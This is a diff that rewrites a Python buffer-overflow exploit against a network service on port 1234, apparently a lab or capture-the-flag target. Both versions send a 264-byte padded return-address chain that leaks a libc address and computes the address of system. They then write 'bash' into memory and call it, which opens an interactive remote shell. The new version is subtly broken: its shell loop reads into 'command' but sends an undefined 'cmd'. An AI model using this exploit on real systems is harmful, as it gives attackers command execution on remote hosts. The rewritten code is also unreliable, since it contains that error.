@@ -1,5 +1,5 @@
-import sys
-import socket
+from sys import stdin
+from socket import *
 import struct
 
 
@@ -8,53 +8,51 @@ port = 1234
 
 address = (host, port)
 
-
-def make_overflow(func, next_func, *args):
-    call_code = b'0' * 264 # for padding
-    call_code += struct.pack('I', 0x0)
-    call_code += struct.pack('I', func)
-    call_code += struct.pack('I', next_func)
-
-    for arg in args:
-        call_code += struct.pack('I', arg)
-
-    call_code += struct.pack('B', 0xa)
-    return call_code
+handle_addr   = 0x08048af4
+send_addr     = 0x0804a270
+sendlen_addr  = 0x08048a61
+recvline_addr = 0x080489e6
+writable_addr = 0x0804a10c
+send_offset   = 0x000e81e0
+system_offset = 0x0003ada0
 
 
-def do_overflow(sock, func, next_func, *args):
-    recv = sock.recv(512)
-    overflow = make_overflow(func, next_func, *args)
-    sock.send(overflow)
-    recv = sock.recv(512)
-    return recv
+def send_bomb(sock, func, next, *args):
+    sock.recv(512)
+
+    bufbomb = b'0' * 264
+    bufbomb += struct.pack('I', 0x0)
+    bufbomb += struct.pack('I', func)
+    bufbomb += struct.pack('I', next)
+
+    for v in args:
+        bufbomb += struct.pack('I', v)
+
+    bufbomb += struct.pack('B', 0xa)
+ 
+    sock.send(bufbomb)
+
+    return sock.recv(512)
 
 
-with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-    s.connect(address)
+if __name__ == '__main__':
+    with socket(AF_INET, SOCK_STREAM) as sock:
+        sock.connect(address)
 
-    handle_addr = 0x08048af4
-    send_offset = 0x000e81e0
-    system_offset = 0x0003ada0
-    sendlen_addr = 0x08048a61
-    recvline_addr = 0x080489e6
-    send_addr_location = 0x804a270
-    writable_location = 0x0804a10c
+        send_bomb(sock, sendlen_addr, handle_addr, send_addr, 0x4)
+        res = sock.recv(4)
+        pwnam_addr = struct.unpack("I", res)[0]
+        system_addr = pwnam_addr - send_offset + system_offset
 
-    res = do_overflow(s, sendlen_addr, handle_addr, send_addr_location, 0x4)
-    res = s.recv(4)
-    getpwnam_addr = struct.unpack("I", res)[0]
-    system_addr = getpwnam_addr - send_offset + system_offset
-
-    data = b'bash\n'
-    do_overflow(s, recvline_addr, handle_addr, writable_location)
-    s.send(data)
-    do_overflow(s, system_addr, handle_addr, writable_location)
-    while True:
-        print('$> ', end='', flush=True)
-        cmd = sys.stdin.readline()
-        s.send(cmd.encode())
-        res = s.recv(512)
-        if cmd == 'exit\n':
-            break
-        print(res)
+        data = b'bash\n'
+        send_bomb(sock, recvline_addr, handle_addr, writable_addr)
+        sock.send(data)
+        send_bomb(sock, system_addr, handle_addr, writable_addr)
+        while True:
+            print('$> ', end='', flush=True)
+            command = stdin.readline()
+            sock.send(cmd.encode())
+            res = sock.recv(512)
+            if command == 'exit\n':
+                break
+            print(res)
